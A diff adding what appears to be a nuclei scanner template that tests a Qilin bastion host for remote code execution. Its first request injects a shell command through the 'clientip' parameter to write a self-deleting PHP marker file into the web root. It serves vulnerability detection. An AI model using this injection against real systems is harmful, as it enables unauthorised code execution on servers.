@@ -1,0 +1,31 @@
+id: poc-yaml-qilin-bastion-host-rce
+
+info:
+  name: poc-yaml-qilin-bastion-host-rce
+  author: For3stCo1d (https://github.com/For3stCo1d)
+  severity: high
+  tags: xray-converted,rce,ct-194308
+  reference:
+    - https://yun.scdsjzx.cn/system/notice/detail/399d2dd0-94aa-4914-a8f6-e71f8dc8ac87
+
+http:
+  - raw:
+      - |
+        GET /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{rand_base(8)}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{rand_base(8)}}.php;&clientport=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
